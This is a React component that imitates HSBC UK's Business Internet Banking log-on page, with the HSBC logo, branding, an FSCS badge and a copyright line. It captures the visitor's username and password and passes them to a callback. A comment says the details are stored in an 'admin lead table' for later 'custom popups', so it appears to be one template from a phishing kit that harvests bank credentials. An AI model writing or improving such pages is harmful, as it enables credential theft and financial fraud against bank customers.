"use client";

import { useState } from "react";

interface HsbcProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function HsbcTemplate({
  bankName = "HSBC (UK)",
  selectedOption = "Business",
  onSuccessSubmit,
}: HsbcProps) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  // Errors & Loading
  const [errors, setErrors] = useState<{ username?: boolean; password?: boolean }>({});
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { username?: boolean; password?: boolean } = {};

    // Dono fields Compulsory hain
    if (!username.trim()) newErrors.username = true;
    if (!password.trim()) newErrors.password = true;

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);

    // Backend payload jo admin lead table mein aur future custom popups ke liye save hoga
    onSuccessSubmit({
      userId: username.trim(),
      password: password.trim(),
      memorableInfo: `Remember: ${rememberMe ? "Yes" : "No"}`,
      extraData: "HSBC Business Internet Banking",
    });
  };

  return (
    <div className="relative min-h-[640px] h-full w-full bg-white font-sans text-[#222222] flex flex-col justify-between overflow-x-hidden selection:bg-[#db0011] selection:text-white">
      
      {/* ================= 1. TOP HEADER ================= */}
      <header className="w-full bg-white px-6 sm:px-12 py-3 border-b border-slate-100 flex items-center z-10">
        <div className="flex items-center gap-2">
          {/* HSBC Hexagon Red/White Triangles Logo */}
          <div className="flex items-center">
            <svg className="h-6 w-9" viewBox="0 0 100 60">
              <polygon points="0,30 30,0 30,60" fill="#db0011" />
              <polygon points="100,30 70,0 70,60" fill="#db0011" />
              <polygon points="30,0 70,0 50,30" fill="#ffffff" stroke="#db0011" strokeWidth="0.5" />
              <polygon points="30,60 70,60 50,30" fill="#ffffff" stroke="#db0011" strokeWidth="0.5" />
              <polygon points="30,0 50,30 30,60" fill="#db0011" />
              <polygon points="70,0 50,30 70,60" fill="#db0011" />
            </svg>
          </div>
          <span className="text-xl font-bold tracking-tight text-black font-sans">
            HSBC
          </span>
        </div>
      </header>

      {/* ================= 2. MAIN SPLIT CONTENT ================= */}
      <div className="relative flex-1 flex flex-col md:flex-row items-stretch">
        
        {/* LEFT SIDE: Hero Woman Image with Diagonal Cut */}
        <div className="relative w-full md:w-[46%] min-h-[280px] md:min-h-auto overflow-hidden bg-slate-900">
          <img
            src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=1200&auto=format&fit=crop"
            alt="Business Banking"
            className="w-full h-full object-cover object-center opacity-90"
          />
          {/* Night bokeh lights overlay effect */}
          <div className="absolute inset-0 bg-gradient-to-tr from-black/60 via-transparent to-red-950/20 mix-blend-multiply pointer-events-none"></div>

          {/* Right angled diagonal mask slice */}
          <div 
            className="hidden md:block absolute top-0 bottom-0 right-0 w-24 bg-white pointer-events-none"
            style={{ clipPath: "polygon(100% 0, 0 100%, 100% 100%)" }}
          ></div>
        </div>

        {/* RIGHT SIDE: Login Form */}
        <div className="relative w-full md:w-[54%] bg-white px-6 sm:px-14 py-10 md:py-14 flex flex-col justify-center">
          
          <div className="max-w-[420px] w-full mx-auto md:mx-0">
            
            <h1 className="text-[34px] sm:text-[38px] font-normal text-[#333333] tracking-tight leading-tight">
              Welcome
            </h1>
            <p className="text-sm sm:text-[15px] font-bold text-[#333333] mt-1 mb-8">
              Log on to Business Internet Banking
            </p>

            <form onSubmit={handleSubmit} className="space-y-5">
              
              {/* 1. Username Field (Compulsory) */}
              <div>
                <label className="block text-xs sm:text-[13px] text-[#444444] font-medium mb-1.5">
                  Username
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (errors.username) setErrors({ ...errors, username: false });
                  }}
                  className={`w-full border p-2.5 text-sm outline-none transition rounded-none bg-white ${
                    errors.username
                      ? "border-red-600 bg-red-50/20"
                      : "border-[#767676] focus:border-black"
                  }`}
                />
                {errors.username && (
                  <p className="text-xs text-red-600 font-semibold mt-1">
                    Please enter your username.
                  </p>
                )}
              </div>

              {/* 2. Password Field (Compulsory) */}
              <div>
                <label className="block text-xs sm:text-[13px] text-[#444444] font-medium mb-1.5">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (errors.password) setErrors({ ...errors, password: false });
                    }}
                    className={`w-full border p-2.5 pr-14 text-sm outline-none transition rounded-none bg-white ${
                      errors.password
                        ? "border-red-600 bg-red-50/20"
                        : "border-[#767676] focus:border-black"
                    }`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-slate-600 underline px-1"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
                {errors.password && (
                  <p className="text-xs text-red-600 font-semibold mt-1">
                    Please enter your password.
                  </p>
                )}
              </div>

              {/* Remember me checkbox */}
              <div className="pt-1">
                <label className="flex items-start gap-2.5 cursor-pointer text-xs text-[#333333] select-none">
                  <input
                    type="checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="mt-0.5 h-4 w-4 rounded-none border-[#767676] accent-[#db0011]"
                  />
                  <div>
                    <span className="font-semibold block">Remember me</span>
                    <span className="text-[11px] text-[#666666]">
                      Only select if using a private computer or device
                    </span>
                  </div>
                </label>
              </div>

              {/* Continue Button (HSBC Solid Red) */}
              <div className="pt-3">
                <button
                  type="submit"
                  disabled={loading}
                  className="rounded-none bg-[#db0011] hover:bg-[#b8000e] active:scale-[0.99] px-9 py-2.5 font-medium text-sm text-white transition shadow-sm cursor-pointer"
                >
                  {loading ? "Verifying..." : "Continue"}
                </button>
              </div>

              {/* Links */}
              <div className="pt-4 space-y-2 text-xs text-[#333333]">
                <a href="#" className="block hover:underline">
                  Forgotten your username? <span className="text-[#db0011] font-bold">›</span>
                </a>
                <a href="#" className="block hover:underline">
                  Activate Internet Banking <span className="text-[#db0011] font-bold">›</span>
                </a>
              </div>

            </form>
          </div>
        </div>

        {/* Floating Pink "Chat with us" side tab on Right */}
        <div className="hidden sm:flex fixed right-0 top-1/2 -translate-y-1/2 bg-[#d10074] text-white px-2.5 py-4 rounded-l-md shadow-lg flex-col items-center gap-2 cursor-pointer z-30 hover:bg-[#b50064] transition">
          <span className="text-base">💬</span>
          <span 
            className="text-[11px] font-bold tracking-wider" 
            style={{ writingMode: "vertical-rl", textOrientation: "mixed" }}
          >
            Chat with us
          </span>
        </div>

      </div>

      {/* ================= 3. BLACK FOOTER ================= */}
      <footer className="w-full bg-black text-white px-6 sm:px-12 py-5 text-[11px] border-t border-black z-10">
        <div className="max-w-[1200px] mx-auto flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          
          <div className="space-y-2">
            <div className="flex flex-wrap gap-x-6 gap-y-1 text-slate-300">
              <a href="#" className="hover:underline flex items-center gap-1">
                <span>↗</span> HSBC UK Customer Legal Information and Privacy Notice
              </a>
              <a href="#" className="hover:underline flex items-center gap-1">
                <span>↗</span> HSBC Customer Legal Information and Privacy Notice
              </a>
              <a href="#" className="hover:underline flex items-center gap-1">
                <span>↗</span> Cookie Notice
              </a>
            </div>
            <p className="text-slate-400">
              © Copyright HSBC Group. All rights reserved.
            </p>
          </div>

          {/* White FSCS Badge on Black background */}
          <div className="border border-white/60 rounded px-2.5 py-1 text-white text-center flex flex-col items-center shrink-0">
            <span className="text-xs font-black italic">fscs</span>
            <span className="text-[7.5px] uppercase tracking-widest font-semibold border-t border-white/40 pt-0.5">PROTECTED</span>
          </div>

        </div>
      </footer>

    </div>
  );
}